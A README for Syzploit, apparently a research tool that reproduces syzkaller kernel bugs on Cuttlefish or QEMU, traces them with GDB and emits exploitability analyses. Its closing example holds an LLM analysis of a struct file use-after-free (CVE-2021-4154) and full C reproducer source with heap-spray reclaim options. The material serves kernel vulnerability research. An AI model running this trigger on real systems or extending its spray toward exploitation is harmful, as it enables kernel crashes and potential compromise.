# Syzploit: Syzbot Repro Analyzer

Syzploit automates reproducing Syzkaller-reported kernel bugs and collecting dynamic analysis from both kernel and userspace. It orchestrates QEMU/Cuttlefish, GDB remote sessions, and structured JSON outputs that will be analyzed to produced primitives based off of the vulnerabilities discovered.

![Overview](images/overview.png)

The diagram shows the flow: SyzVerify -> SyzAnalyze -> Exploit Synthesis.

## Docker

You can run kexploit in a docker container. The Dockerfile is provided in the repository. We also provide a script to run everything once the docker container is built.
To build the docker image, run:
```sh
./build
```
To run the docker container, you can use the provided script:
```sh
./set-env
```
This will mount the current `syzploit` directory to `/workspace/syzbot-repro` in the container, match the network to the host network, and then also run it in user mode so all of the data collected can be accessed from the host machine.

## Cuttlefish Setup (Optional)

Start the cuttlefish emulator on cuttlefish server, and run adb once to start adb daemon:
```sh
cd /home/jack/cuttlefish_images/aosp_android13_cgi/cf
HOME=$PWD ./bin/launch_cvd -kernel_path=/home/jack/ingots/kernel/Image -initramfs_path=/home/jack/ingots/kernel/initramfs.img
./bin/adb shell
```
The above command starts ingots kernel 5.10.101, but there are many different kernel versions on cuttlefish server.

Setup ssh port forwarding for adb on local machine running kexploit:
```sh
ssh -L localhost:5037:localhost:5037 cuttlefish-user@cuttlefish-host
```

`uv run syzploit test <bug_id>` can now be used to test syzkaller bugs.

## Running

Run `uv run syzploit` to run syzploit. There are various commands and subcommands that can be run (see `uv run syzploit --help`).
### Project Layout
- `src/syzploit/` — main Python package
  - `main.py` — CLI entry and command routing
  - `SyzVerify/` — validation and dynamic analysis
    - `dynamic.py` — orchestrates QEMU/Cuttlefish, kernel GDB, and userspace `gdbserver`; collects events and writes JSON
    - `gdb.py` — helpers for generating GDB scripts/commands
    - `userspace_gdb.py` — userspace tracing via gdbserver; monitor-only mode supported
    - `run_bug.py` — VM boot + repro execution + artifact management
    - `bug_db.py` — local metadata for syzbot bugs
  - `SyzAnalyze/` — crash post-processing
    - `crash_analyzer.py` — parses crash logs and correlates with runtime events
  - `syzploit_data/` — downloaded syzbot bug data
  - `syzkall_crashes/` — output crash analyses and JSON artifacts

## SyzVerify: Dynamic Analysis

SyzVerify automates dynamic analysis of kernel bugs by orchestrating VM execution, kernel GDB tracing, and optional userspace gdbserver tracing. It collects memory allocation/free events and watchpoint hits, exporting structured JSON for further analysis.

### Key Capabilities
- Kernel GDB tracing: attaches to `qemu` or device’s kgdb over TCP; supports monitor-only tracing and deferred breakpoints when early pages aren’t mapped.
- Userspace tracing: optional `gdbserver` attach to the repro process; records watchpoints and RIP events without pausing (monitor-only).
- KASLR-aware resolution: uses `System.map` and KASLR slide to compute runtime addresses when symbols are stripped; defers address breakpoints until memory is accessible.
- Unified outputs: exports `events`, `allocations`, and `frees` as JSON, plus raw logs.

### Usage
- `uv run syzploit pull`: pull exploits from syzkaller website and save locally
  - database with syzkall exploits metadata already created and pushed in github so this shouldn't be needed
```sh
 Usage: syzploit pull [OPTIONS]                                         
                                                                                
╭─ Options ────────────────────────────────────────────────────────────────────╮
│ --syzkall-kernel        TEXT  Kernel name to pull bugs for                   │
│                               [default: android-5-10]                        │
│ --help                        Show this message and exit.                    │
╰──────────────────────────────────────────────────────────────────────────────╯
```
- `uv run syzploit  query`: query available POCs pulled from syzkaller website
  - kind of incomplete, I just wrote random code here and changed code itself when looking for different bugs
```sh
 Usage: syzploit query [OPTIONS]                                        
                                                                                
╭─ Options ────────────────────────────────────────────────────────────────────╮
│ --syzkall-kernel        TEXT  Kernel name to pull bugs for                   │
│                               [default: android-5-10]                        │
│ --help                        Show this message and exit.                    │
╰──────────────────────────────────────────────────────────────────────────────╯
```
- `uv run syzploit  test <bug_id>`: run the given bug on cuttlefish and reprot if crash occurred
  - see [here](#setup-for-running-syzkaller-pocs-on-cuttlefish) for neccessary setup for `syzploit test`
```sh
 Usage: syzploit test [OPTIONS] BUG_ID

 Test a specific bug from syzbot


╭─ Arguments ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *    bug_id      TEXT  Bug ID to test [default: None] [required]                                                                                     │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --local               --no-local                        Use local cuttlefish instance [default: local]                                               │
│ --root                --no-root                         Run repro as root user in VM [default: root]                                                 │
│ --arch                                         TEXT     Architecture of kernel to test bugs on [default: x86_64]                                     │
│ --syzkall-kernel                               TEXT     Kernel name to pull bugs for [default: android-5-10]                                         │
│ --qemu                --no-qemu                         Use QEMU VM instead of cuttlefish [default: no-qemu]                                         │
│ --source-image                                 PATH     Path to source image [default: None]                                                         │
│ --source-disk                                  PATH     Path to source disk [default: None]                                                          │
│ --outdir-name                                  TEXT     Output directory name for crash artifacts [default: syzkall_crashes]                         │
│ --dynamic-analysis    --no-dynamic-analysis             Enable GDB-based dynamic analysis [default: no-dynamic-analysis]                             │
│ --gdb-port                                     INTEGER  GDB port for dynamic analysis [default: 1234]                                                │
│ --help                                                  Show this message and exit.                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```
- `uv run syzploit  testall`: run all available syzkaller POCs on cuttlefish and report if crash occurred
  - this will take a long time, so be careful with this command and make sure the connection isn't disconnected otherwise you may need to restart the port forwarding and adb 
```sh
 Usage: syzploit testall [OPTIONS]

 Test all bugs from syzbot for a given kernel version


╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --local               --no-local                        Use local cuttlefish instance [default: no-local]                                            │
│ --arch                                         TEXT     Architecture of kernel to test bugs on [default: x86_64]                                     │
│ --syzkall-kernel                               TEXT     Kernel name to pull bugs for [default: android-5-10]                                         │
│ --qemu                --no-qemu                         Use QEMU VM instead of cuttlefish [default: no-qemu]                                         │
│ --source-image                                 PATH     Path to source image [default: None]                                                         │
│ --source-disk                                  PATH     Path to source disk [default: None]                                                          │
│ --source              --no-source                       Test bugs from syzbot source image [default: no-source]                                      │
│ --root                --no-root                         Run repro as root user in VM [default: no-root]                                              │
│ --outdir-name                                  TEXT     Output directory name for crash artifacts [default: syzkall_crashes]                         │
│ --dynamic-analysis    --no-dynamic-analysis             Enable GDB-based dynamic analysis [default: no-dynamic-analysis]                             │
│ --gdb-port                                     INTEGER  GDB port for dynamic analysis [default: 1234]                                                │
│ --help                                                  Show this message and exit.                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```
- `uv run syzploit collectstats`: This will collect statistics on all of the syzbot crashes to provide a starting point for understanding all of the crashes for a given kernel version.
```sh
 Usage: syzploit collectstats [OPTIONS]                                 
                                                                                
╭─ Options ────────────────────────────────────────────────────────────────────╮
│ --syzkall-kernel        TEXT  Kernel name to pull bugs for                   │
│                               [default: android-5-10]                        │
│ --outfile               TEXT  Output file to write stats to                  │
│                               [default: syzkall_stats]                       │
│ --help                        Show this message and exit.                    │
╰──────────────────────────────────────────────────────────────────────────────╯
```


There are also extensions for all of the commands above to allow for you to specify the kernel version you want to pull from and use for testing. The default version is `android-5.10`, but you can specify any kernel version that is available in the syzbot database.
For example, if you want to run against the current upstream kernel, you can use:
```sh
uv run syzploit pull --syzkall-kernel upstream
uv run syzploit testall --syzkall-kernel upstream
```

## SyzAnalyze: Crash Post-Processing
SyzAnalyze processes crash logs and correlates them with dynamic analysis events collected by SyzVerify. It helps identify memory corruption patterns and relevant allocations/frees. This is automatically run for all SyzVerify tests.

### Key Capabilities
- Crash log parsing: extracts RIP, error codes, and call stacks from kernel crash logs (e.g., dmesg).
- Event correlation: matches crash RIP with watchpoint hits and memory events from SyzVerify JSON outputs.
- Memory corruption identification: highlights suspicious allocations/frees and access patterns leading to the crash.
- Structured reporting: outputs findings in JSON for further exploit synthesis.
- Generic Primitve Generation: generates generic primitives based on the analysis results that can be used for exploit synthesis.

### Usage
- `uv run syzploit analyze <bug_id>`: analyze crash logs for the given bug using collected dynamic analysis JSON.
```sh
 Usage: syzploit analyze [OPTIONS] BUG_ID

 Analyze a specific bug with static and optional dynamic analysis


╭─ Arguments ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *    bug_id      TEXT  Bug ID to analyze [default: None] [required]                                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --syzkall-kernel                               TEXT     Kernel name for bug [default: android-5-10]                                                  │
│ --qemu                --no-qemu                         Use QEMU VM [default: no-qemu]                                                               │
│ --source-image                                 PATH     Path to kernel image [default: None]                                                         │
│ --source-disk                                  PATH     Path to disk image [default: None]                                                           │
│ --dynamic-analysis    --no-dynamic-analysis             Enable GDB-based dynamic analysis [default: dynamic-analysis]                                │
│ --gdb-port                                     INTEGER  GDB port [default: 1234]                                                                     │
│ --arch                                         TEXT     Architecture of kernel to analyze [default: x86_64]                                          │
│ --output-dir                                   PATH     Output directory for analysis results [default: None]                                        │
│ --help                                                  Show this message and exit.                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```

## Syzploit Example: Setup for Running Syzkaller POCs on Cuttlefish
On the host machine:
```sh
ssh -L localhost:5037:localhost:5037 cuttlefish-user@cuttlefish-host
cd ~/ingots2/U-2.1.TA1
./run.sh
```

In a seperate terminal on the host machine:
```sh
./build
./set-env
docker attach syzploit
cd /workspace/syzploit
uv run syzploit pull
uv run syzploit test <bug_id> --root
```
Note: The docker container can only be run on x86 machines as of right now

## Using Tools Independently

You can use each part on its own:
- `SyzVerify/dynamic.py`: Run dynamic analysis on a single bug folder with your VM. It starts kernel GDB and optionally userspace gdbserver, collects events, and writes JSON.
  - Example: `uv run kexploit syzkall test <bug_id> --qemu`
- `SyzAnalyze/crash_analyzer.py`: Parse kernel crash logs (e.g., dmesg) and correlate with dynamic events; useful even without GDB if you only have logs.
- `SyzVerify/userspace_gdb.py`: Attach to a local or remote process via gdbserver for monitor-only tracing (no breakpoints) or selective watchpoints.
- `SyzVerify/gdb.py`: Generate and run GDB scripts tailored to your scenario; source them manually in your GDB session if desired.

## Syzploit Example: Setup for Running Syzkaller POCs with QEMU and GDB

Make sure you have the `bzImage` and `disk.img` for the kernel version you want to test. You can build your own kernel or download prebuilt images from various sources. Once you have the images, you can use the following steps to run a syzkaller POC with QEMU and GDB tracing.

```sh
./build
./set-env
docker attach syzploit
cd /workspace/syzploit
uv run syzploit pull --syzkall-kernel upstream
uv run syzploit test 283ce5a46486d6acdbaf --qemu --root --source-image /path/to/bzImage --source-disk /path/to/disk.img
```

This specific example tests the bug with ID `283ce5a46486d6acdbaf` from the upstream kernel syzkaller bugs. Adjust the `--source-image` and `--source-disk` paths to point to your kernel and disk images. This bug is associated with CVE-2021-4154. You will then get your crash artifacts in the `syzkall_crashes` directory. Along with the SyzAnalyze results for that bug in an `anlysis_<bug_id>` folder. The results will be in JSON format for easy parsing and further analysis called `static_analysis.json` and `dynamic_analysis.json` if dynamic analysis was enabled. The format looks as follows:
```json
  "llm_analysis": {
    "prompt": "...",
    "openai_llm": {
      "raw_output": "...",
      "parsed": {
        "overview": {
          "exploitability": "MEDIUM",
          "rationale": "Use-after-free read of struct file in filp_close (fs/open.c:1306) triggered when close(fd) operates on a dangling file pointer still present in the fd table; evidenced by KASAN UAF at filp_close and prior __fput free in the same task.",
          "primitive_capabilities": "Allows triggering a UAF read on struct file during close(), leading to kernel OOPS/DoS; control over which file object is freed (via the fd chosen) but no direct write primitive at the crash site."
        },
        "preconditions": [
          {
            "summary": "User calls close(fd) on a descriptor whose fdtable slot still holds a pointer to a struct file that has already been freed by __fput.",
            "concrete_constraints": [
              "fd => integer, fd >= 0 and fd < current->files->fdt->max_fds",
              "current->files->fdt[fd] => non-NULL at the instant of lookup in close_fd()",
              "struct file at current->files->fdt[fd] => already freed by __fput (dangling pointer), e.g., via fscontext_release/put_fs_context as shown in the free stack"
            ],
            "why_reaches_crash": "filp_close() reads filp->f_count via atomic_long_read() on the freed object, triggering UAF."
          }
        ],
        "postconditions": [
          {
            "state_after_crash": "Kernel dereferenced a freed struct file object (from kmem_cache 'filp') while executing filp_close().",
            "kernel_impact": "Use-after-free read; potential for control-flow or further corruption if the freed memory is reallocated to attacker-influenced data in non-KASAN builds; immediate OOPS under KASAN.",
            "error_states": [
              "KASAN: use-after-free",
              "OOPS/panic in filp_close",
              "Process termination (SIGSEGV/BUG) and possible system instability"
            ],
            "data_leaked": "None directly at the crash site; atomic read does not leak to user space.",
            "controlability": [
              "Attacker controls which fd is closed and thus which struct file is targeted.",
              "Attacker can influence timing by creating/dropping references to cause early __fput via task_work_run."
            ]
          }
        ],
        "path_constraints": {
          "input": [
            {
              "file": "fs/open.c",
              "line": 1329,
              "code": "if ((int)fd < 0) return -EBADF;",
              "condition": "fd must be non-negative",
              "why_it_blocks": "Negative fd causes early -EBADF and avoids reaching close path altogether.",
              "note": "Exact line text inferred from upstream; snippet not provided."
            },
            {
              "file": "fs/file.c",
              "line": 628,
              "code": "if (!file) return -EBADF;",
              "condition": "fcheck_files(files, fd) must return non-NULL",
              "why_it_blocks": "If the fd slot is NULL, close_fd returns -EBADF before calling filp_close().",
              "note": "Exact line text inferred from upstream; snippet not provided."
            }
          ],
          "kernel_state": [
            {
              "file": "fs/open.c",
              "line": 1306,
              "code": "atomic_long_read(&filp->f_count);",
              "condition": "filp must point to a live struct file; here it is dangling (already freed by __fput).",
              "why_it_blocks": "Normally invariant: fdtable should not hold a pointer to a freed struct file; violation allows UAF when filp_close reads f_count.",
              "note": "Crash site per log; exact source line not provided in snippets."
            },
            {
              "file": "fs/file_table.c",
              "line": 280,
              "code": "__fput(file);",
              "condition": "Another path dropped the last ref and freed the file (task_work_run/exit_to_user_mode).",
              "why_it_blocks": "If __fput did not run (file still alive), filp_close would operate on a valid object; reaching UAF requires that __fput has already freed the object while the fd slot still points to it.",
              "note": "Context from crash log; guard/ordering not present in provided snippets."
            }
          ]
        },
        "evidence": [
          {
            "file": "fs/open.c",
            "line": 1306,
            "code": "filp_close+0x22/0x170",
            "note": "KASAN reports UAF read at filp_close; the read is via atomic_long_read on filp->f_count."
          },
          {
            "file": "fs/file.c",
            "line": 628,
            "code": "close_fd+0x5c/0x80",
            "note": "close_fd obtains file pointer from fd table and later calls filp_close(file)."
          },
          {
            "file": "fs/open.c",
            "line": 1329,
            "code": "__x64_sys_close+0x2f/0xa0",
            "note": "Entry point for close syscall with user-controlled fd."
          },
          {
            "file": "fs/file_table.c",
            "line": 280,
            "code": "__fput+0x288/0x920",
            "note": "Free path that released the struct file before close(), as shown in the 'Freed by task' stack."
          },
          {
            "file": "fs/fs_context.c",
            "line": 454,
            "code": "put_fs_context+0x3fb/0x650",
            "note": "Release path involved in freeing, showing a plausible scenario where __fput ran and freed the file prior to close()."
          }
        ]
      }
    },
    "summary": null
  },
  "reproducer": {
    "source_path": "/workspace/syzploit/syzploit_data/syzbot_bugs/283ce5a46486d6acdbaf/repro_generic.c",
    "binary_path": "/workspace/syzploit/syzploit_data/syzbot_bugs/283ce5a46486d6acdbaf/repro_generic",
    "compiled": true,
    "error": "",
    "source": "// GENERIC REPRODUCER TEMPLATE (c code only, no commentary)\n\n#define _GNU_SOURCE\n#include <errno.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/eventfd.h>\n#include <sys/mman.h>\n#include <sys/resource.h>\n#include <sys/signalfd.h>\n#include <sys/stat.h>\n#include <sys/syscall.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <unistd.h>\n\n// --- syscalls (provide numbers if missing) ---\n#ifndef __NR_fsopen\n#define __NR_fsopen 430\n#endif\n#ifndef __NR_fsconfig\n#define __NR_fsconfig 431\n#endif\n#ifndef __NR_memfd_create\n#if defined(__x86_64__)\n#define __NR_memfd_create 319\n#elif defined(__i386__)\n#define __NR_memfd_create 356\n#elif defined(__aarch64__)\n#define __NR_memfd_create 279\n#else\n#define __NR_memfd_create 0\n#endif\n#endif\n#ifndef __NR_dup3\n#if defined(__x86_64__)\n#define __NR_dup3 292\n#elif defined(__i386__)\n#define __NR_dup3 330\n#elif defined(__aarch64__)\n#define __NR_dup3 24\n#else\n#define __NR_dup3 0\n#endif\n#endif\n\n// --- USER-CONTROLLED KNOBS ---\n\n// Which filesystem context to open (must be mountable via new mount API on target kernel)\n// Example candidates: \"cgroup\", \"cgroup2\", \"overlay\", \"erofs\", \"ext4\" (not all support fsopen).\n#ifndef USER_FS_TYPE\n#define USER_FS_TYPE \"cgroup\"\n#endif\n\n// fsopen flags (commonly 0)\n#ifndef USER_FSOPEN_FLAGS\n#define USER_FSOPEN_FLAGS 0u\n#endif\n\n// Key used with FSCONFIG_SET_FD (commonly \"source\", \"lowerdir\", \"upperdir\", etc.)\n// Keep as \"source\" to mirror the known trigger path.\n#ifndef USER_SOURCE_KEY\n#define USER_SOURCE_KEY \"source\"\n#endif\n\n// Target fd index to place the vulnerable fscontext file at (=-1 to skip pinning)\n#ifndef USER_PIN_FD\n#define USER_PIN_FD (-1)\n#endif\n\n// Postcondition scenario selector:\n// 0 = Trigger on process exit (do not close fscontext explicitly).\n// 1 = Trigger by explicit close(fsctx_fd) after trigger setup.\n// 2 = Spray 'struct file' allocations before close to influence reuse; then close(fsctx_fd).\n// 3 = Aggressive spray/reclaim: open many files, close some to churn, then close(fsctx_fd).\n#ifndef USER_SCENARIO\n#define USER_SCENARIO 1\n#endif\n\n// Number of spray fds to open (used in scenarios 2 and 3).\n#ifndef USER_SPRAY_FD_COUNT\n#define USER_SPRAY_FD_COUNT 2048\n#endif\n\n// Spray strategy:\n// 0 = open(\"/dev/null\")\n// 1 = memfd_create()\n// 2 = eventfd(0, 0)\n// 3 = signalfd(-1, empty_set, 0)\n#ifndef USER_SPRAY_KIND\n#define USER_SPRAY_KIND 1\n#endif\n\n// Optional pause (microseconds) before the final close or exit to let task_work/__fput scheduling settle.\n#ifndef USER_UAF_PAUSE_USEC\n#define USER_UAF_PAUSE_USEC 1000\n#endif\n\n// RLIMIT_NOFILE soft/hard limits for the process to enable large sprays.\n#ifndef USER_NOFILE_SOFT\n#define USER_NOFILE_SOFT 65535\n#endif\n#ifndef USER_NOFILE_HARD\n#define USER_NOFILE_HARD 65535\n#endif\n\n// Optional: move fscontext fd to a \"high\" slot to affect fdtable layout expansion.\n// If USER_PIN_FD >= 0, FD pinning is attempted via dup3.\n#ifndef USER_DUP3_FLAGS\n#define USER_DUP3_FLAGS 0u\n#endif\n\n// Optional: which auxiliary fd to pass to FSCONFIG_SET_FD.\n// 0 = open(\"/\") as O_RDONLY|O_DIRECTORY\n// 1 = open(\"/dev/null\", O_RDONLY)\n// 2 = memfd_create()\n// 3 = eventfd(0, 0)\n#ifndef USER_AUXFD_KIND\n#define USER_AUXFD_KIND 0\n#endif\n\n// Optional: attempt multiple trigger iterations (>=1).\n#ifndef USER_TRIALS\n#define USER_TRIALS 1\n#endif\n\n// --- constants for fsconfig commands ---\n#ifndef FSCONFIG_SET_FD\n#define FSCONFIG_SET_FD 5u\n#endif\n\n// --- helpers ---\nstatic inline int sys_fsopen(const char* type, unsigned int flags) {\n  return (int)syscall(__NR_fsopen, type, flags);\n}\nstatic inline int sys_fsconfig_set_fd(int fsfd, unsigned int cmd, const char* key, int aux_fd) {\n  return (int)syscall(__NR_fsconfig, fsfd, cmd, key, NULL, aux_fd);\n}\nstatic inline int sys_memfd_create(const char* name, unsigned int flags) {\n#if __NR_memfd_create\n  return (int)syscall(__NR_memfd_create, name, flags);\n#else\n  (void)name; (void)flags;\n  errno = ENOSYS;\n  return -1;\n#endif\n}\nstatic inline int sys_dup3(int oldfd, int newfd, unsigned int flags) {\n#if __NR_dup3\n  return (int)syscall(__NR_dup3, oldfd, newfd, flags);\n#else\n  (void)oldfd; (void)newfd; (void)flags;\n  errno = ENOSYS;\n  return -1;\n#endif\n}\n\nstatic void set_nofile_rlimit(rlim_t soft, rlim_t hard) {\n  struct rlimit rl;\n  rl.rlim_cur = soft;\n  rl.rlim_max = hard;\n  setrlimit(RLIMIT_NOFILE, &rl);\n}\n\nstatic int open_aux_fd(int kind) {\n  if (kind == 0) {\n    int fd = open(\"/\", O_RDONLY | O_DIRECTORY | O_CLOEXEC);\n    if (fd >= 0) return fd;\n  }\n  if (kind == 1) {\n    int fd = open(\"/dev/null\", O_RDONLY | O_CLOEXEC);\n    if (fd >= 0) return fd;\n  }\n  if (kind == 2) {\n    int fd = sys_memfd_create(\"aux\", 0);\n    if (fd >= 0) return fd;\n  }\n  if (kind == 3) {\n    int fd = eventfd(0, EFD_CLOEXEC);\n    if (fd >= 0) return fd;\n  }\n  // Last resort\n  return open(\"/dev/zero\", O_RDONLY | O_CLOEXEC);\n}\n\nstatic int spray_open_one(int kind) {\n  switch (kind) {\n    case 0: return open(\"/dev/null\", O_RDONLY | O_CLOEXEC);\n    case 1: return sys_memfd_create(\"spray\", 0);\n    case 2: return eventfd(0, EFD_CLOEXEC);\n    case 3: {\n      sigset_t ss;\n      sigemptyset(&ss);\n      return signalfd(-1, &ss, SFD_CLOEXEC);\n    }\n    default: return open(\"/dev/null\", O_RDONLY | O_CLOEXEC);\n  }\n}\n\nstatic int* spray_open(int kind, int count, int* out_count) {\n  if (count <= 0) { if (out_count) *out_count = 0; return NULL; }\n  int* fds = (int*)calloc((size_t)count, sizeof(int));\n  int opened = 0;\n  for (int i = 0; i < count; i++) {\n    int fd = spray_open_one(kind);\n    if (fd >= 0) fds[opened++] = fd;\n    else break;\n  }\n  if (out_count) *out_count = opened;\n  return fds;\n}\n\nstatic void spray_close(int* fds, int count, int stride) {\n  if (!fds || count <= 0) return;\n  if (stride <= 0) stride = 1;\n  for (int i = 0; i < count; i += stride) {\n    if (fds[i] >= 0) close(fds[i]);\n  }\n}\n\nstatic void burn_cpu(int iters) {\n  volatile unsigned long x = 0;\n  for (int i = 0; i < iters; i++) x += (unsigned long)i * 2654435761u;\n  (void)x;\n}\n\nint main(void) {\n  set_nofile_rlimit(USER_NOFILE_SOFT, USER_NOFILE_HARD);\n\n  for (int trial = 0; trial < USER_TRIALS; trial++) {\n    // Step 1: Create a filesystem context \"file\" (vulnerable object lives in struct file)\n    int fsctx_fd = sys_fsopen(USER_FS_TYPE, USER_FSOPEN_FLAGS);\n    if (fsctx_fd < 0) {\n      // If fsopen fails, skip this trial.\n      continue;\n    }\n\n    // Optional: place fsctx fd at a specific slot to influence fdtable layout and close ordering.\n    if (USER_PIN_FD >= 0 && USER_PIN_FD != fsctx_fd) {\n      int newfd = sys_dup3(fsctx_fd, USER_PIN_FD, USER_DUP3_FLAGS);\n      if (newfd >= 0) {\n        close(fsctx_fd);\n        fsctx_fd = newfd;\n      }\n    }\n\n    // Step 2: Obtain an auxiliary fd to feed into fsconfig (FSCONFIG_SET_FD)\n    int aux_fd = open_aux_fd(USER_AUXFD_KIND);\n    if (aux_fd < 0) {\n      // If aux fd can't be opened, proceed anyway (some kernels will still exercise the buggy path).\n    }\n\n    // Step 3: Trigger the mis-accounting/early release via fsconfig command that takes an fd.\n    // This call is expected to drive fscontext_release()/put_fs_context() such that the fscontext's\n    // struct file can be freed before close(fd) consumes it.\n    (void)sys_fsconfig_set_fd(fsctx_fd, FSCONFIG_SET_FD, USER_SOURCE_KEY, aux_fd);\n\n    // Small pause to allow any task_work/__fput scheduling to occur before we close.\n    if (USER_UAF_PAUSE_USEC > 0) {\n      usleep(USER_UAF_PAUSE_USEC);\n      sched_yield();\n      burn_cpu(1000);\n    }\n\n    // Optional additional disturbance to allocation timing\n    int spray_count = 0;\n    int* spray_fds = NULL;\n\n    if (USER_SCENARIO == 2 || USER_SCENARIO == 3) {\n      spray_fds = spray_open(USER_SPRAY_KIND, USER_SPRAY_FD_COUNT, &spray_count);\n      // In scenario 3, churn the allocator a bit: close every Nth fd to induce reuse.\n      if (USER_SCENARIO == 3) {\n        spray_close(spray_fds, spray_count, 3);\n        usleep(USER_UAF_PAUSE_USEC);\n      }\n    }\n\n    // Step 4: Choose how to reach filp_close on the dangling file pointer.\n    if (USER_SCENARIO == 0) {\n      // Leave fsctx_fd open; rely on exit_files closing it at process exit.\n      // Avoid explicit close here.\n      (void)fsctx_fd;\n    } else {\n      // Close explicitly to hit filp_close() on a potentially freed struct file.\n      close(fsctx_fd);\n    }\n\n    // Keep spray fds alive across the close to maximize reuse window\n    if (spray_fds) {\n      // Optionally keep them open until end of trial; they will be closed here.\n      for (int i = 0; i < spray_count; i++) {\n        if (spray_fds[i] >= 0) close(spray_fds[i]);\n      }\n      free(spray_fds);\n      spray_fds = NULL;\n    }\n\n    if (aux_fd >= 0) close(aux_fd);\n  }\n\n  // Scenario 0: trigger on exit by not closing fsctx_fd explicitly; others already closed.\n  return 0;\n}"
  },
  "dynamic_analysis": null
  ```